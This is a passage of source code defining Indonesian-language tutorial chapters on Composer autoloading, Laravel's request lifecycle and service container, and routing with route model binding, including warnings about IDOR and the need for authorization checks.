            'Namespace tidak cocok dengan letaknya',
            '`namespace App\\Service;` di `src/Layanan/`',
            'Buka berkasnya, bandingkan baris `namespace` dengan jalurnya',
          ],
          [
            'Pemetaan di `composer.json` belum diperbarui',
            'Folder baru ditambahkan tanpa `dump-autoload`',
            'Jalankan `composer dump-autoload`',
          ],
        ],
      ),
      p(
        'Baris pertama itu penyebab bug yang paling melelahkan dari keempatnya, yaitu kode yang berjalan sempurna di laptop dan gagal di server. Sistem berkas Linux membedakan `Layanan` dari `layanan`, sedangkan macOS dan Windows pada setelan bawaan tidak. Jadi kesalahan huruf besar kecil tidak pernah muncul selama pengembangan dan baru muncul pada deploy pertama.',
      ),
      callout(
        'warning',
        'Contoh Laravel dan Composer di bab ini TIDAK dijalankan',
        'Composer dan Laravel tidak terpasang di project ini, dan aturan project melarang menambah dependency tanpa persetujuan lebih dulu (`core.md`, Dependency Version Gate). Seluruh potongan yang memakai API Laravel disusun mengikuti dokumentasi resminya. Yang **dijalankan sungguhan** adalah PHP 8.3.6 yang memang terpasang, dan setiap keluaran yang diberi keterangan "dijalankan sungguhan" di bab ini berasal dari sana — termasuk autoloading di atas, service container lewat Reflection, dan pelolosan karakter yang mendasari Blade.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Kegagalan yang berhubungan dengan dependency punya satu ciri yang membedakannya, yaitu ia sering muncul **hanya di satu tempat**, entah hanya di laptop atau hanya di produksi, dan itu yang membuatnya membingungkan.',
      ),
      code(
        'text',
        `
        KEGAGALAN 1 — jalan di laptop, gagal di produksi

          Error: Class "App\\Layanan\\Pesanan" not found

          Penyebab yang paling sering: huruf besar kecil pada nama folder.
          Linux peka, macOS tidak. Kesalahannya SUDAH ADA sejak awal dan
          baru terlihat di mesin yang peka.

        KEGAGALAN 2 — jalan di produksi, gagal di laptop rekan

          Your lock file does not contain a compatible set of packages.

          Penyebab: composer.lock tidak ikut ke repo, atau seseorang menjalankan
          composer update alih-alih composer install. Berkas lock itu yang
          menjamin setiap mesin memasang versi yang SAMA PERSIS.

        KEGAGALAN 3 — jalan saat dikembangkan, gagal setelah deploy

          Class "Faker\\Factory" not found

          Penyebab: paket ada di require-dev, sedangkan produksi memasang
          dengan --no-dev. Apa pun yang dibutuhkan saat berjalan harus
          berada di require, bukan require-dev.
        `,
      ),
      p(
        'Kegagalan kedua memuat perbedaan yang menentukan dan sering tertukar, yaitu antara `composer install` dan `composer update`. Yang pertama memasang versi yang **tepat tercatat** di `composer.lock`, sehingga setiap mesin mendapat isi yang identik. Yang kedua **mengabaikan** lock, mencari versi terbaru yang masih memenuhi batasan di `composer.json`, lalu menulis ulang lock-nya.',
      ),
      code(
        'text',
        `
        Kapan memakai yang mana, dan ini tidak boleh tertukar:

          composer install   -> di CI, di produksi, dan setiap kali mengambil
                                perubahan orang lain. Ia TIDAK pernah mengubah versi.

          composer update    -> HANYA saat kamu memang berniat menaikkan versi,
                                sengaja, dan hasilnya direview seperti perubahan kode.

        composer.lock WAJIB ikut ke repo. Tanpa berkas itu, tidak ada satu pun
        jaminan bahwa yang berjalan di produksi sama dengan yang kamu uji.
        `,
      ),
      p(
        'Perlu ditegaskan satu hal yang sering disalahpahami tentang batasan versi di `composer.json`. Penanda `^10.0` berarti "boleh naik selama versi mayornya tetap 10", jadi menjalankan `composer update` bisa mengubah `10.1.3` menjadi `10.48.0` dengan ratusan perubahan di dalamnya. Itu bukan kesalahan Composer melainkan tepat yang diminta oleh tanda itu, dan itulah alasan `update` tidak boleh dijalankan sambil lalu.',
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Kesalahan di bagian ini murah diperbaiki saat ditemukan dan mahal ditemukan, sebab gejalanya muncul di tempat yang berbeda dari penyebabnya.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Tidak memasukkan `composer.lock` ke repo',
            'Isinya kan bisa dihasilkan ulang',
            'Setiap mesin memasang versi yang berbeda-beda. Tidak ada jaminan yang diuji sama dengan yang berjalan',
          ],
          [
            'Menjalankan `composer update` untuk memasang dependency',
            'Namanya terdengar seperti menyegarkan',
            'Ia menaikkan versi SELURUH paket. Untuk memasang yang sudah tercatat, pakai `composer install`',
          ],
          [
            'Menaruh paket yang dipakai saat berjalan di `require-dev`',
            'Dipakainya saat mengembangkan',
            'Produksi memasang dengan `--no-dev`, dan paketnya tidak ikut. Muncul sebagai `Class not found`',
          ],
          [
            'Menamai folder berbeda huruf besar kecil dari namespace-nya',
            'Di laptop jalan',
            'Diuji sungguhan, PSR-4 menerjemahkan namespace jadi jalur satu lawan satu. Linux peka huruf',
          ],
          [
            'Menaruh beberapa kelas dalam satu berkas',
            'Berhubungan erat, kan',
            'Autoloader mencari satu berkas per kelas. Kelas kedua tidak akan pernah ditemukan',
          ],
          [
            'Menambah paket tanpa memeriksa apa yang ikut terbawa',
            'Satu paket saja',
            'Satu paket bisa membawa puluhan paket lain, dan masing-masing adalah kode yang berjalan dengan hak aplikasimu',
          ],
        ],
      ),
      p(
        'Baris terakhir pantas ditegaskan karena biayanya tidak terlihat di `composer.json`. Sebuah paket kecil bisa membawa puluhan dependency lain, dan setiap satunya adalah kode yang dijalankan server dengan hak akses penuh aplikasimu, termasuk ke basis data dan ke berkas rahasia. Sebelum menambahkan paket, periksa kapan terakhir dirawat, berapa banyak yang memakainya, dan berapa banyak yang ikut terbawa. Untuk pekerjaan yang bisa diselesaikan dua puluh baris kode sendiri, dua puluh baris itu sering pilihan yang lebih murah.',
      ),
      references(
        {
          label: 'Composer — Basic usage',
          href: 'https://getcomposer.org/doc/01-basic-usage.md',
          source: 'Composer',
          note: 'Beda `install` dan `update`, serta peran `composer.lock`.',
        },
        {
          label: 'Composer — Autoloading',
          href: 'https://getcomposer.org/doc/04-schema.md#autoload',
          source: 'Composer',
          note: 'Mekanisme yang menggantikan `require` manual di setiap berkas.',
        },
        {
          label: 'Laravel — Directory Structure',
          href: 'https://laravel.com/docs/12.x/structure',
          source: 'Laravel',
          note: 'Peran setiap folder, termasuk kenapa hanya `public/` yang terbuka ke web.',
        },
        {
          label: 'Laravel — Installation & Configuration',
          href: 'https://laravel.com/docs/12.x/configuration',
          source: 'Laravel',
          note: 'Hubungan `.env` dengan berkas di `config/`, dan peran `APP_KEY`.',
        },
      ),
    ],
  ),

  written(
    'siklus-request-laravel',
    'Siklus Request Laravel & Service Container',
    19,
    'Perjalanan permintaan di dalam framework, dan mesin yang menyatukannya.',
    [
      terms(
        {
          term: 'siklus request',
          meaning:
            'Urutan tahap yang dilewati permintaan di dalam framework. Bandingkan dengan Express: strukturnya **sama persis** — bedanya, di Express kamu memasang tiap tahap dengan `app.use()`, di Laravel tahapannya sudah ada dan kamu mengisinya.',
        },
        {
          term: 'public/index.php',
          meaning:
            'Titik masuk **satu-satunya**. Setiap permintaan ke aplikasi Laravel, ke alamat mana pun, melewati berkas ini. Ini yang disebut *front controller* — kebalikan dari PHP era lama, di mana setiap URL adalah berkas berbeda.',
        },
        {
          term: 'bootstrap/app.php',
          meaning:
            'Tempat aplikasi dirakit — pendaftaran middleware, penanganan error, dan konfigurasi rute. Sejak Laravel 11 semuanya terpusat di sini, menggantikan beberapa berkas terpisah di versi lama.',
        },
        {
          term: 'service container',
          meaning:
            'Tempat Laravel menyimpan **cara membuat objek**. Saat sebuah kelas membutuhkan sesuatu, ia cukup menyebutkan tipenya di konstruktor — container yang menyediakannya. Tidak ada `new` yang ditulis tangan.',
        },
        {
          term: 'dependency injection',
          meaning:
            'Menerima ketergantungan dari luar alih-alih membuatnya sendiri. Manfaatnya baru terasa saat menguji: kamu bisa mengganti `LayananCatatan` dengan versi palsu **tanpa menyentuh controller-nya**. Kelas yang menulis `new LayananCatatan()` terikat mati dan tidak bisa diuji tanpa database sungguhan.',
        },
        {
          term: 'bind',
          meaning:
            'Mendaftarkan ke container: "kalau ada yang minta antarmuka ini, berikan kelas itu". Ini yang membuat kode bergantung pada **kontrak**, bukan pada implementasi tertentu — sehingga menukar SMTP dengan layanan lain tidak menyentuh pemanggilnya.',
        },
        {
          term: 'singleton',
          meaning:
            'Objek yang dibuat **sekali** lalu dipakai ulang sepanjang permintaan. Dipakai untuk hal yang mahal dibuat — klien HTTP, koneksi. Bedanya dari `bind`, yang membuat instans baru setiap kali diminta.',
        },
        {
          term: 'service provider',
          meaning:
            'Kelas tempat pendaftaran ke container dilakukan. Metode `register()` mengisi container; `boot()` berjalan setelah semuanya terdaftar. Memisahkan keduanya mencegah urutan pendaftaran jadi masalah.',
        },
        {
          term: 'middleware global vs rute',
          meaning:
            'Dua tingkat penjagaan. **Global** berjalan untuk setiap permintaan, misalnya CORS, batas ukuran body, dan trim string. **Rute** hanya untuk rute yang menyebutnya, misalnya `auth` dan `throttle`. Persis pembagian `app.use()` versus middleware per rute di Express.',
        },
      ),

      h2('Perjalanannya'),
      code(
        'text',
        `
        public/index.php
              │
              ▼
        bootstrap/app.php          rakit aplikasi
              │
              ▼
        Middleware global          CORS, ukuran body, trim
              │
              ▼
        Router                     cocokkan URL -> controller
              │
              ▼
        Middleware rute            auth, throttle, policy
              │
              ▼
        Form Request               validasi + otorisasi
              │
              ▼
        Controller                 -> Service -> Model
              │
              ▼
        Resource                   bentuk JSON
              │
              ▼
        Response
        `,
      ),
      p(
        'Bandingkan dengan Express: strukturnya sama persis. Bedanya, di Express kamu memasang setiap tahap dengan `app.use()`; di Laravel tahapannya sudah ada dan kamu mengisinya.',
      ),

      h2('Service Container'),
      p(
        'Container adalah tempat Laravel menyimpan cara membuat objek. Saat sebuah kelas membutuhkan sesuatu, ia cukup **menyebutkan tipenya** di konstruktor — container yang menyediakannya.',
      ),
      code(
        'php',
        `
        <?php

        declare(strict_types=1);

        namespace App\\Http\\Controllers;

        use App\\Services\\LayananCatatan;

        final class CatatanController extends Controller
        {
            // Laravel membaca tipe ini dan menyuntikkan instansnya sendiri.
            // Tidak ada 'new LayananCatatan(...)' di mana pun.
            public function __construct(
                private readonly LayananCatatan $layanan,
            ) {}

            public function index()
            {
                return $this->layanan->daftar();
            }
        }
        `,
      ),
      p(
        'Perhatikan tidak ada `new LayananCatatan(...)` di mana pun, padahal `$this->layanan` bisa dipakai. Itulah kerja service container: Laravel membaca **tipe** pada parameter konstruktor, mencari cara membuat objek bertipe itu, lalu menyuntikkannya sendiri. Kalau `LayananCatatan` sendiri membutuhkan sesuatu di konstruktornya, container juga akan menyediakannya secara berantai — kamu tidak pernah merangkai objeknya secara manual.',
      ),
      p(
        'Yang membuat ini berharga bukan kenyamanannya, melainkan **siapa yang menentukan** implementasinya. Controller ini tidak tahu bagaimana `LayananCatatan` dibuat, jadi saat menguji, kamu bisa menyuruh container memberikan versi tiruan tanpa menyentuh satu baris pun di sini. Bandingkan dengan controller yang menulis `new LayananCatatan()` di dalam method-nya: ia terikat mati pada implementasi itu, dan mengujinya berarti menyiapkan database sungguhan.',
      ),
      callout(
        'info',
        'Kenapa ini berguna',
        'Saat menguji, kamu bisa mengganti `LayananCatatan` dengan versi palsu tanpa menyentuh controller-nya. Tanpa container, controller yang menulis `new LayananCatatan()` terikat mati pada implementasi itu — dan tidak bisa diuji tanpa database sungguhan.',
      ),

      h2('Mengikat antarmuka ke implementasi'),
      code(
        'php',
        `
        // app/Providers/AppServiceProvider.php
        public function register(): void
        {
            $this->app->bind(
                \\App\\Contracts\\PengirimEmail::class,
                \\App\\Services\\PengirimEmailSmtp::class,
            );

            // singleton: dibuat sekali, dipakai ulang sepanjang permintaan
            $this->app->singleton(KlienPembayaran::class, function ($app) {
                return new KlienPembayaran(config('layanan.pembayaran.kunci'));
            });
        }
        `,
      ),
      p(
        '`bind` mengajarkan container satu aturan, yaitu setiap kali ada yang meminta antarmuka `PengirimEmail`, berikan `PengirimEmailSmtp`. Karena kelas-kelas lain hanya menyebut **antarmukanya**, mengganti penyedia email nanti cukup mengubah satu baris di sini tanpa ada berkas lain yang menyebut nama implementasinya. Ini juga yang membuat pengujian mudah, sebab satu `bind` ke versi tiruan sudah membuat seluruh aplikasi memakai yang tiruan.',
      ),
      p(
        'Beda `bind` dan `singleton` ada pada berapa kali objeknya dibuat. `bind` membuat instans **baru** setiap kali diminta; `singleton` membuatnya sekali lalu memakai ulang untuk sisa permintaan itu. Pakai `singleton` ketika objeknya mahal dibuat atau memang harus tunggal — seperti `KlienPembayaran` yang membaca konfigurasi dan mungkin memegang koneksi. Perhatikan pula ia dibuat lewat closure, sehingga kunci dari `config(...)` baru dibaca ketika objeknya benar-benar dibutuhkan, bukan di setiap permintaan yang tidak menyentuh pembayaran sama sekali.',
      ),

      h2('Facade'),
      code(
        'php',
        `
        use Illuminate\\Support\\Facades\\DB;
        use Illuminate\\Support\\Facades\\Cache;

        $pengguna = DB::table('pengguna')->where('id', 1)->first();
        Cache::put('kunci', $nilai, 600);
        `,
      ),
      p(
        'Facade adalah jalan pintas statis menuju objek di container. Ia ringkas dibaca, tapi menyembunyikan ketergantungan: dari tanda tangan kelasnya, kamu tidak bisa tahu ia memakai `Cache`.',
      ),
      compare(
        {
          title: 'Facade',
          lang: 'php',
          code: `
          final class LayananCatatan
          {
              public function daftar(): Collection
              {
                  return Cache::remember(
                      'catatan', 60,
                      fn () => Catatan::all(),
                  );
              }
          }
          `,
          notes: ['Ringkas', 'Ketergantungan tersembunyi', 'Perlu bantuan khusus saat diuji'],
        },
        {
          title: 'Injeksi',
          lang: 'php',
          code: `
          final class LayananCatatan
          {
              public function __construct(
                  private readonly Repository $cache,
              ) {}

              public function daftar(): Collection
              {
                  return $this->cache->remember(
                      'catatan', 60,
                      fn () => Catatan::all(),
                  );
              }
          }
          `,
          notes: ['Ketergantungan terlihat di konstruktor', 'Mudah diganti saat diuji'],
        },
      ),
      p(
        'Untuk controller dan kode sederhana, facade wajar. Untuk service yang memuat aturan bisnis dan perlu diuji, injeksi lewat konstruktor lebih baik.',
      ),
      h2('Studi kasus di project nyata'),
      p(
        'Bagian siklus permintaan Laravel yang paling menentukan cara kode ditulis bukan urutan middleware melainkan **service container**, sebab dialah yang membuat dependency injection bekerja. Berikut mekanismenya ditulis ulang dengan Reflection bawaan PHP, lalu benar-benar dijalankan.',
      ),
      code(
        'php',
        `
        <?php
        final class Container
        {
            private array $pengikatan = [];

            public function bind(string $abstrak, callable $pembuat): void
            {
                $this->pengikatan[$abstrak] = $pembuat;
            }

            public function make(string $kelas): object
            {
                if (isset($this->pengikatan[$kelas])) return ($this->pengikatan[$kelas])($this);

                $r = new ReflectionClass($kelas);
                if (!$r->isInstantiable()) {
                    throw new RuntimeException("Tidak bisa membuat $kelas: " .
                        ($r->isInterface() ? 'ini interface' : 'abstrak'));
                }
                $ctor = $r->getConstructor();
                if ($ctor === null) return new $kelas();

                // INILAH yang membuat autowiring bekerja: membaca TIPE tiap
                // parameter konstruktor, lalu menyelesaikannya secara rekursif.
                $args = [];
                foreach ($ctor->getParameters() as $p) {
                    $t = $p->getType();
                    if ($t instanceof ReflectionNamedType && !$t->isBuiltin()) {
                        $args[] = $this->make($t->getName());
                    } elseif ($p->isDefaultValueAvailable()) {
                        $args[] = $p->getDefaultValue();
                    } else {
                        throw new RuntimeException("Tidak bisa menyelesaikan \\\${$p->getName()} pada $kelas");
                    }
                }
                return $r->newInstanceArgs($args);
            }
        }
        `,
        { caption: 'Kode ini benar-benar dijalankan dengan PHP 8.3.6; hasilnya ada di bawah.' },
      ),
      code(
        'text',
        `
        Tanpa pengikatan, interface tidak bisa dibuat:
          RuntimeException: Tidak bisa membuat PengirimSurel: ini interface

        Setelah interface diikat ke implementasinya:
          $c->bind(PengirimSurel::class, fn() => new SurelSMTP());

          LayananPesanan dibuat, dependensinya: RepoPesanan + SurelSMTP
          hasil pemakaian: SMTP -> rina@contoh.id
        `,
        { caption: 'Dijalankan sungguhan. Tidak satu pun `new` ditulis di dalam LayananPesanan.' },
      ),
      p(
        'Yang terjadi di situ layak diurai. `LayananPesanan` hanya menyebutkan **apa yang dibutuhkannya** lewat tipe parameter konstruktornya, dan tidak pernah menyebutkan dari mana benda itu datang. Container membaca tipe-tipe itu lewat Reflection, menyelesaikan masing-masing secara rekursif, lalu menyerahkannya. Inilah seluruh isi istilah dependency injection, dan Laravel melakukannya dengan cara yang sama persis, hanya jauh lebih lengkap.',
      ),
      p(
        'Manfaatnya baru benar-benar terasa saat menulis test, dan itu bisa ditunjukkan dengan satu baris.',
      ),
      code(
        'text',
        `
        final class SurelPalsu implements PengirimSurel {
            public array $terkirim = [];
            public function kirim(string $ke, string $isi): string {
                $this->terkirim[] = $ke; return 'palsu';
            }
        }

        $c->bind(PengirimSurel::class, fn() => $palsu);

          surel yang "terkirim" saat test: budi@contoh.id
        `,
        { caption: 'Dijalankan sungguhan. Satu baris bind menukar seluruh implementasi.' },
      ),
      p(
        'Perhatikan bahwa `LayananPesanan` sama sekali tidak disentuh. Kelas itu tidak tahu dan tidak perlu tahu bahwa surelnya sekarang palsu, sebab yang diketahuinya hanya sebuah interface. Bandingkan dengan bentuk yang menulis `new SurelSMTP()` langsung di dalamnya, yang membuat pengujian mustahil tanpa benar-benar mengirim surel.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Container menghasilkan sekelompok error yang khas, dan ketiganya menunjuk hal yang berbeda meski bunyinya mirip.',
      ),
      code(
        'text',
        `
        1. Interface belum diikat ke implementasi mana pun

           RuntimeException: Tidak bisa membuat PengirimSurel: ini interface

           Di Laravel bentuknya:
             Target [App\\Contracts\\PengirimSurel] is not instantiable.

           Perbaikannya: daftarkan pengikatannya di sebuah service provider.

        2. Parameter bertipe bawaan tanpa nilai bawaan

           RuntimeException: Tidak bisa menyelesaikan $dsn pada RepoPesanan

           Container tidak bisa menebak nilai string atau int. Beri nilai bawaan,
           atau daftarkan pembuatnya sendiri lewat bind.

        3. Ketergantungan melingkar

           Container mencoba membuat A, yang butuh B, yang butuh A, dan seterusnya
           sampai tumpukan pemanggilannya habis.
        `,
      ),
      p(
        'Kegagalan ketiga punya bentuk yang sama dengan lingkaran ketergantungan modul yang sudah diukur di bab Express, dan akarnya juga sama, yaitu arah ketergantungan yang tidak dijaga. Bedanya hanya bahwa di sini ia ditemukan container saat menyusun objek, bukan oleh sistem modul saat memuat berkas.',
      ),
      p(
        'Ada satu bentuk pemakaian container yang menghasilkan kode yang sulit diuji, dan bentuk itu justru yang paling mudah ditulis.',
      ),
      code(
        'php',
        `
        // BENTUK YANG MENYULITKAN — mengambil dari container di tengah kode.
        final class LayananPesanan
        {
            public function buat(array $data): Pesanan
            {
                // Ketergantungannya TERSEMBUNYI. Membaca tanda tangan kelas ini
                // tidak memberi tahu bahwa ia butuh pengirim surel.
                $surel = app(PengirimSurel::class);
                $surel->kirim($data['email'], 'Pesanan diterima');
                // ...
            }
        }

        // BENTUK YANG JELAS — dependensinya disebut di konstruktor.
        final class LayananPesanan
        {
            public function __construct(
                private readonly PengirimSurel $surel,
                private readonly RepoPesanan $repo,
            ) {}
        }
        `,
        {
          caption:
            'Bentuk pertama bernama service locator, dan ia menyembunyikan tepat apa yang perlu terlihat.',
        },
      ),
      p(
        'Selisihnya bukan selera. Pada bentuk kedua, membaca konstruktornya langsung memberi tahu seluruh hal yang dibutuhkan kelas itu, dan test bisa menyerahkan versi palsunya tanpa menyentuh container sama sekali. Pada bentuk pertama, satu-satunya cara mengetahui dependensinya adalah membaca seluruh isi kelas, dan test harus menyiapkan container lengkap meski hanya menguji satu perhitungan.',
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Container adalah bagian Laravel yang paling terasa seperti sihir, dan justru itu alasan memahami mekanismenya berpengaruh pada cara menulis kode.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Memanggil `app()` atau helper di tengah kelas',
            'Lebih ringkas daripada konstruktor',
            'Dependensinya jadi tersembunyi, dan test harus menyiapkan container lengkap untuk menguji satu perhitungan',
          ],
          [
            'Menulis `new` untuk dependensi di dalam kelas',
            'Paling langsung',
            'Implementasinya jadi tidak bisa ditukar. Test tidak punya cara mencegah surel sungguhan terkirim',
          ],
          [
            'Mengetikkan kelas konkret, bukan interface',
            'Kelasnya kan cuma satu',
            'Selama masih satu, tidak apa-apa. Begitu butuh versi palsu untuk test, seluruh pemanggilnya harus diubah',
          ],
          [
            'Mendaftarkan semua sebagai singleton',
            'Lebih hemat',
            'Objek yang menyimpan keadaan jadi bocor antar-permintaan. Singleton hanya untuk yang memang tanpa keadaan',
          ],
          [
            'Menaruh logika berat di service provider',
            'Dijalankan sekali di awal',
            'Ia berjalan pada SETIAP permintaan, termasuk yang tidak memakainya. Daftarkan pembuatnya, jangan jalankan',
          ],
          [
            'Menganggap container membuat kode otomatis rapi',
            'Namanya juga dependency injection',
            'Container hanya menyusun objek. Batas tanggung jawab tetap keputusanmu',
          ],
        ],
      ),
      p(
        'Baris kelima punya akibat yang terukur dan sering tidak disadari. Service provider dijalankan sebagai bagian dari penyalaan aplikasi pada **setiap** permintaan, jadi membuka koneksi, membaca berkas, atau memanggil layanan luar di dalamnya menambahkan biaya itu ke seluruh permintaan, termasuk yang sama sekali tidak menyentuh bagian tersebut. Yang benar adalah mendaftarkan **cara membuatnya** lewat closure, sehingga pekerjaannya baru terjadi ketika benda itu benar-benar diminta.',
      ),
      references(
        {
          label: 'Request Lifecycle',
          href: 'https://laravel.com/docs/12.x/lifecycle',
          source: 'Laravel',
          note: 'Perjalanan permintaan dari `public/index.php` sampai respons.',
        },
        {
          label: 'Service Container',
          href: 'https://laravel.com/docs/12.x/container',
          source: 'Laravel',
          note: 'Cara container menyelesaikan ketergantungan dari tipe di konstruktor.',
        },
        {
          label: 'Service Providers',
          href: 'https://laravel.com/docs/12.x/providers',
          source: 'Laravel',
          note: 'Beda `register()` dan `boot()`, serta kenapa urutannya penting.',
        },
        {
          label: 'Facades — dan kapan tidak memakainya',
          href: 'https://laravel.com/docs/12.x/facades',
          source: 'Laravel',
          note: 'Termasuk bagian resmi "Facades Vs. Dependency Injection".',
        },
      ),
    ],
  ),

  written(
    'routing-laravel',
    'Routing & Route Model Binding',
    15,
    'Memetakan URL, dan membiarkan Laravel mengambil datanya.',
    [
      terms(
        {
          term: 'Route::get / post / patch',
          meaning:
            "Cara mendaftarkan rute di Laravel. Bentuknya `[Controller::class, 'namaMetode']` — bukan fungsi anonim, supaya rute tetap terbaca sebagai daftar dan logikanya hidup di controller.",
        },
        {
          term: 'apiResource',
          meaning:
            'Satu baris yang mendaftarkan **lima rute REST sekaligus** — index, store, show, update, destroy. Ia menegakkan konvensi penamaan, sehingga setiap project Laravel punya bentuk yang sama dan bisa dibaca tanpa dokumentasi.',
        },
        {
          term: 'api.php vs web.php',
          meaning:
            'Rute di `api.php` **stateless**: tanpa sesi, tanpa cookie, tanpa perlindungan CSRF, dan otomatis berprefiks `/api`. Rute di `web.php` memakai sesi dan CSRF. Menaruh endpoint API di `web.php` membuatnya menolak permintaan tanpa token CSRF — sumber kebingungan yang sangat sering.',
        },
        {
          term: 'route model binding',
          meaning:
            'Laravel mengambil datanya sendiri dari database berdasarkan parameter rute, dan **otomatis menjawab 404** kalau tidak ada. Controller menerima objek model, bukan id — pola yang berulang di setiap rute jadi hilang.',
        },
        {
          term: 'binding ≠ otorisasi',
          meaning:
            'Peringatan terpenting sub-bab ini. Binding **mengambil datanya, tidak memeriksa kewenangannya**. Laravel akan dengan senang hati memberikan catatan milik siapa pun kepada siapa pun yang tahu id-nya.',
        },
        {
          term: 'IDOR di Laravel',
          meaning:
            'Bentuk IDOR yang paling sering muncul justru karena kodenya **terlihat bersih**: `public function show(Catatan $catatan)` tidak menampakkan apa pun yang salah. Otorisasi harus ditambahkan sendiri lewat Policy atau scope query.',
        },
        {
          term: 'authorize()',
          meaning:
            "Pemanggilan yang menjalankan Policy untuk aksi tertentu — `$this->authorize('view', $catatan)`. Ia melempar `403` kalau ditolak. **Wajib ada** di setiap aksi yang menyentuh data milik pengguna.",
        },
        {
          term: 'custom route key',
          meaning:
            'Mengganti kolom yang dipakai binding dari `id` ke kolom lain — biasanya `slug`. Ditulis `{catatan:slug}` di rute, atau dengan mendefinisikan `getRouteKeyName()` di model.',
        },
        {
          term: 'route grup',
          meaning:
            "Membungkus beberapa rute dengan setelan bersama — prefiks, middleware, atau namespace. Ia padanan `app.use('/api', router)` di Express: penjagaan dipasang sekali untuk sekelompok rute.",
        },
      ),

      h2('Rute dasar'),
      code(
        'php',
        `
        // routes/api.php
        use App\\Http\\Controllers\\CatatanController;
        use Illuminate\\Support\\Facades\\Route;

        Route::get('/catatan', [CatatanController::class, 'index']);
        Route::post('/catatan', [CatatanController::class, 'store']);
        Route::get('/catatan/{catatan}', [CatatanController::class, 'show']);
        Route::patch('/catatan/{catatan}', [CatatanController::class, 'update']);
        Route::delete('/catatan/{catatan}', [CatatanController::class, 'destroy']);

        // Kelima rute di atas dalam satu baris
        Route::apiResource('catatan', CatatanController::class);
        `,
      ),
      p(
        "Bandingkan lima baris ini dengan `router.get(...)` di Express, karena bentuknya berbeda tapi isinya sama. `[CatatanController::class, 'index']` menyebut kelas beserta nama method-nya, dan `{catatan}` adalah route parameter yang setara dengan `:id`. Yang perlu diperhatikan, nama parameternya `{catatan}` alih-alih `{id}`, dan itu disengaja karena nama itulah yang nanti dicocokkan dengan tipe `Catatan` pada method controller supaya route model binding bekerja.",
      ),
      p(
        'Baris `apiResource` menggantikan kelimanya sekaligus dengan konvensi nama method yang baku, yaitu `index`, `store`, `show`, `update`, dan `destroy`. Nilainya bukan sekadar hemat baris melainkan **keseragaman**, sebab setiap sumber daya di aplikasimu memakai pola alamat dan nama method yang sama sehingga siapa pun bisa menebak di mana kode sebuah endpoint berada. Perhatikan namanya `apiResource` alih-alih `resource`, karena yang terakhir juga membuat rute `create` dan `edit` untuk menampilkan formulir HTML yang tidak berguna pada API.',
      ),
      callout(
        'info',
        '`routes/api.php` berbeda dari `routes/web.php`',
        'Rute di `api.php` **stateless**: tanpa sesi, tanpa cookie, tanpa perlindungan CSRF, dan otomatis berprefiks `/api`. Rute di `web.php` memakai sesi dan CSRF. Menaruh endpoint API di `web.php` akan membuatnya menolak permintaan tanpa token CSRF — sumber kebingungan yang sangat sering.',
      ),

      h2('Route Model Binding'),
      compare(
        {
          title: 'Manual',
          lang: 'php',
          code: `
          Route::get('/catatan/{id}', function (int $id) {
              $catatan = Catatan::find($id);

              if ($catatan === null) {
                  abort(404);
              }

              return $catatan;
          });
          `,
          notes: ['Pola yang sama diulang di setiap rute'],
        },
        {
          title: 'Binding',
          lang: 'php',
          code: `
          // Nama parameter {catatan} cocok
          // dengan tipe Catatan -> Laravel
          // mengambilnya sendiri, dan
          // otomatis 404 kalau tidak ada.
          Route::get('/catatan/{catatan}',
              function (Catatan $catatan) {
                  return $catatan;
              });
          `,
          notes: ['404 otomatis', 'Controller menerima model, bukan id'],
        },
      ),
      p(
        'Kolom kanan menghapus empat baris yang di kolom kiri harus diulang di setiap rute. Mekanismenya: nama parameter `{catatan}` di alamat cocok dengan nama variabel `$catatan` yang bertipe `Catatan`, dan dari situ Laravel tahu ia harus mencari baris dengan id tersebut lalu menyerahkannya ke fungsimu. Kalau barisnya tidak ada, Laravel sendiri yang menjawab `404` — jadi kodemu boleh mengasumsikan `$catatan` selalu ada.',
      ),
      p(
        'Justru di situ letak bahayanya, dan peringatan di bawah perlu dibaca serius. Binding menjawab "baris ini ada", **bukan** "kamu berhak melihatnya". Kodenya terlihat bersih dan tidak ada yang tampak salah — dan itulah kenapa bentuk IDOR ini begitu sering lolos di aplikasi Laravel. Kolom kiri setidaknya masih memperlihatkan query-nya secara terbuka, sehingga tidak adanya pemeriksaan pemilik lebih mudah terlihat saat review.',
      ),
      callout(
        'danger',
        'Binding mengambil datanya, TIDAK memeriksa kewenangannya',
        'Laravel akan dengan senang hati memberikan catatan milik siapa pun kepada siapa pun yang tahu id-nya. Ini bentuk IDOR yang paling sering muncul di aplikasi Laravel — karena kodenya terlihat bersih dan tidak ada yang tampak salah. Otorisasi tetap harus ditambahkan sendiri, lewat Policy (sub-bab 5.6) atau scope query.',
      ),
      code(
        'php',
        `
        public function show(Catatan $catatan)
        {
            // WAJIB — tanpa baris ini, siapa pun bisa membaca catatan siapa pun.
            $this->authorize('view', $catatan);

            return new CatatanResource($catatan);
        }
        `,
      ),
      p(
        "Satu baris `$this->authorize('view', $catatan)` inilah yang menutup celahnya. Ia menjalankan method `view` pada Policy sumber daya tersebut dan **melempar `403`** kalau ditolak, sehingga baris di bawahnya tidak pernah tercapai. Perhatikan argumen keduanya berupa objek `$catatan`, bukan id — itulah yang membedakannya dari pemeriksaan izin biasa: Policy memutuskan berdasarkan **objek ini**, sehingga ia bisa membandingkan `penulis_id`-nya dengan pengguna yang sedang masuk.",
      ),
      p(
        'Jadikan pemanggilan ini refleks: setiap method controller yang menerima model dari route binding butuh satu baris `authorize` sebelum menyentuh datanya. Untuk data privat, pertimbangkan Policy yang membuatnya tampak tidak ada — di sub-bab 5.7 alasannya sudah dibahas, `403` sudah membocorkan bahwa barisnya memang ada.',
      ),

      h2('Binding dengan kolom lain'),
      code(
        'php',
        `
        // Cocokkan dengan slug, bukan id
        Route::get('/artikel/{artikel:slug}', [ArtikelController::class, 'show']);

        // Binding bersarang: pastikan komentar BENAR-BENAR milik artikel itu
        Route::get('/artikel/{artikel}/komentar/{komentar}', ...)->scopeBindings();
        `,
      ),
      p(
